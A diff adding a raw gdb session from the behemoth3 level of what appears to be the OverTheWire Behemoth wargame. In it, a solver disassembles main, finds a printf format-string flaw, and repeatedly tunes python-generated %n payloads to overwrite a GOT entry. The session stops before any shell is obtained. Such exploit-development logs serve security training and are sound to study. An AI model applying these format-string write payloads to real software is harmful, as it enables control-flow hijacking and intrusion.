@@ -1,0 +1,480 @@
+```
+behemoth3@behemoth:/behemoth$ gdb behemoth3
+GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from behemoth3...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804847b <+0>:	push   ebp
+   0x0804847c <+1>:	mov    ebp,esp
+   0x0804847e <+3>:	sub    esp,0xc8
+   0x08048484 <+9>:	push   0x8048560
+   0x08048489 <+14>:	call   0x8048330 <printf@plt>
+   0x0804848e <+19>:	add    esp,0x4
+   0x08048491 <+22>:	mov    eax,ds:0x80497c0
+   0x08048496 <+27>:	push   eax
+   0x08048497 <+28>:	push   0xc8
+   0x0804849c <+33>:	lea    eax,[ebp-0xc8]
+   0x080484a2 <+39>:	push   eax
+   0x080484a3 <+40>:	call   0x8048340 <fgets@plt>
+   0x080484a8 <+45>:	add    esp,0xc
+   0x080484ab <+48>:	push   0x8048574
+   0x080484b0 <+53>:	call   0x8048330 <printf@plt>
+   0x080484b5 <+58>:	add    esp,0x4
+   0x080484b8 <+61>:	lea    eax,[ebp-0xc8]
+   0x080484be <+67>:	push   eax
+   0x080484bf <+68>:	call   0x8048330 <printf@plt>
+   0x080484c4 <+73>:	add    esp,0x4
+   0x080484c7 <+76>:	push   0x804857e
+   0x080484cc <+81>:	call   0x8048350 <puts@plt>
+   0x080484d1 <+86>:	add    esp,0x4
+   0x080484d4 <+89>:	mov    eax,0x0
+   0x080484d9 <+94>:	leave  
+   0x080484da <+95>:	ret    
+End of assembler dump.
+(gdb) b *main+81
+Breakpoint 1 at 0x80484cc
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08%8x%n')")
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08%8x%n')")
+Identify yourself: Welcome, AAAA��41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000010 in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08%200x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08%200x%n')")
+Identify yourself: Welcome, AAAA��                                                                                                                                                                                                41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000d0 in ?? ()
+(gdb) p 0xac-0xd0
+$1 = -36
+(gdb) p 0xac-0x10
+$2 = 156
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08%156x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08%156x%n')")
+Identify yourself: Welcome, AAAA��                                                                                                                                                    41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000a4 in ?? ()
+(gdb) p 0xac-0x10+8
+$3 = 164
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08%164x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08%164x%n')")
+Identify yourself: Welcome, AAAA��                                                                                                                                                            41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000ac in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x08%164x%110%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x08%164x%110%n')")
+Identify yourself: Welcome, AAAA��AAAA�                                                                                                                                                            41414141%n
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+aaaand goodbye again.
+[Inferior 1 (process 28201) exited normally]
+(gdb) p 0x97-0xac
+$4 = -21
+(gdb) p 0x197-0xac
+$5 = 235
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x08%164x%235x%n')")
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x08%164x%235x%n')")
+
+Program received signal SIGSEGV, Segmentation fault.
+0xf7e55137 in vfprintf () from /lib32/libc.so.6
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x08%164x%n%235x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x08%164x%n%235x%n')")
+
+Program received signal SIGSEGV, Segmentation fault.
+0xf7e55137 in vfprintf () from /lib32/libc.so.6
+(gdb) c
+Continuing.
+
+Program terminated with signal SIGSEGV, Segmentation fault.
+The program no longer exists.
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%164x%n%235x%n')")
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%164x%n%235x%n')")
+Identify yourself: Welcome, AAAA��AAAA��                                                                                                                                                            41414141                                                                                                                                                                                                                                   41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00019fb4 in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%164x%n%230x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%164x%n%230x%n')")
+Identify yourself: Welcome, AAAA��AAAA��                                                                                                                                                            41414141                                                                                                                                                                                                                              41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00019ab4 in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%164x%n%200x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%164x%n%200x%n')")
+Identify yourself: Welcome, AAAA��AAAA��                                                                                                                                                            41414141                                                                                                                                                                                                41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00017cb4 in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%164x%n%160x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%164x%n%160x%n')")
+Identify yourself: Welcome, AAAA��AAAA��                                                                                                                                                            41414141                                                                                                                                                        41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000154b4 in ?? ()
+(gdb) p 0x197-0xac
+$6 = 235
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%164x%n%235x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%164x%n%235x%n')")
+Identify yourself: Welcome, AAAA��AAAA��                                                                                                                                                            41414141                                                                                                                                                                                                                                   41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00019fb4 in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%164x%n%100x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%164x%n%100x%n')")
+Identify yourself: Welcome, AAAA��AAAA��                                                                                                                                                            41414141                                                                                            41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000118b4 in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%164x%n%5x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%164x%n%5x%n')")
+Identify yourself: Welcome, AAAA��AAAA��                                                                                                                                                            4141414141414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000bcb4 in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%164x%n%50x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%164x%n%50x%n')")
+Identify yourself: Welcome, AAAA��AAAA��                                                                                                                                                            41414141                                          41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000e6b4 in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%156x%n%235x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08%156x%n%235x%n')")
+Identify yourself: Welcome, AAAA��AAAA��                                                                                                                                                    41414141                                                                                                                                                                                                                                   41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000197ac in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%156x%n%235x%n%235%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%156x%n%235x%n%235%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��                                                                                                                                                    41414141                                                                                                                                                                                                                                   41414141%n
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00019fb4 in ?? ()
+(gdb) p 0x104-0x97
+$7 = 109
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%156x%n%235x%n%109%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%156x%n%235x%n%109%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��                                                                                                                                                    41414141                                                                                                                                                                                                                                   41414141%n
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00019fb4 in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%156x%n%235x%n%109x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%156x%n%235x%n%109x%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��                                                                                                                                                    41414141                                                                                                                                                                                                                                   41414141                                                                                                     41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x020c9fb4 in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%164x%n%235x%n%109x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%164x%n%235x%n%109x%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��                                                                                                                                                            41414141                                                                                                                                                                                                                                   41414141                                                                                                     41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0214a7bc in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%168x%n%235x%n%109x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%168x%n%235x%n%109x%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��                                                                                                                                                                41414141                                                                                                                                                                                                                                   41414141                                                                                                     41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0218abc0 in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%156x%n%235x%n%109x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) c
+Please answer y or n.
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%156x%n%235x%n%109x%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��                                                                                                                                                    41414141                                                                                                                                                                                                                                   41414141                                                                                                     41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x020c9fb4 in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%146x%n%235x%n%109x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%146x%n%235x%n%109x%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��                                                                                                                                          41414141                                                                                                                                                                                                                                   41414141                                                                                                     41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x020295aa in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%144x%n%235x%n%109x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%144x%n%235x%n%109x%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��                                                                                                                                        41414141                                                                                                                                                                                                                                   41414141                                                                                                     41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x020093a8 in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%150x%n%235x%n%109x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%150x%n%235x%n%109x%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��                                                                                                                                              41414141                                                                                                                                                                                                                                   41414141                                                                                                     41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x020699ae in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%148x%n%235x%n%109x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08%148x%n%235x%n%109x%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��                                                                                                                                            41414141                                                                                                                                                                                                                                   41414141                                                                                                     41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x020497ac in ?? ()
+(gdb) p 0x08-0x04
+$8 = 4
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%148x%n%235x%n%109x%n%4x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%148x%n%235x%n%109x%n%4x%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��AAAA��                                                                                                                                            41414141                                                                                                                                                                                                                                   41414141                                                                                                     4141414141414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x140c9fb4 in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%140x%n%235x%n%109x%n%4x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%140x%n%235x%n%109x%n%4x%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��AAAA��                                                                                                                                    41414141                                                                                                                                                                                                                                   41414141                                                                                                     4141414141414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0c0497ac in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%136x%n%235x%n%109x%n%4x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%136x%n%235x%n%109x%n%4x%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��AAAA��                                                                                                                                41414141                                                                                                                                                                                                                                   41414141                                                                                                     4141414141414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x080093a8 in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%138x%n%235x%n%109x%n%4x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%138x%n%235x%n%109x%n%4x%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��AAAA��                                                                                                                                  41414141                                                                                                                                                                                                                                   41414141                                                                                                     4141414141414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0a0295aa in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%140x%n%235x%n%109x%n%4x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%140x%n%235x%n%109x%n%4x%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��AAAA��                                                                                                                                    41414141                                                                                                                                                                                                                                   41414141                                                                                                     4141414141414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0c0497ac in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%137x%n%235x%n%109x%n%4x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%137x%n%235x%n%109x%n%4x%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��AAAA��                                                                                                                                 41414141                                                                                                                                                                                                                                   41414141                                                                                                     4141414141414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x090194a9 in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%136x%n%235x%n%109x%n%4x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%136x%n%235x%n%109x%n%4x%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��AAAA��                                                                                                                                41414141                                                                                                                                                                                                                                   41414141                                                                                                     4141414141414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x080093a8 in ?? ()
+(gdb) p 0x108-0x04
+$9 = 260
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%148x%n%235x%n%109x%n%260x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%148x%n%235x%n%109x%n%260x%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��AAAA��                                                                                                                                            41414141                                                                                                                                                                                                                                   41414141                                                                                                     41414141                                                                                                                                                                                                                                                            41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x100c9fb4 in ?? ()
+(gdb) r <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%140x%n%235x%n%109x%n%260x%n')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /behemoth/behemoth3 <<< $(python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%140x%n%235x%n%109x%n%260x%n')")
+Identify yourself: Welcome, AAAA��AAAA��AAAA��AAAA��                                                                                                                                    41414141                                                                                                                                                                                                                                   41414141                                                                                                     41414141                                                                                                                                                                                                                                                            41414141
+
+Breakpoint 1, 0x080484cc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x080497ac in _GLOBAL_OFFSET_TABLE_ ()
+```
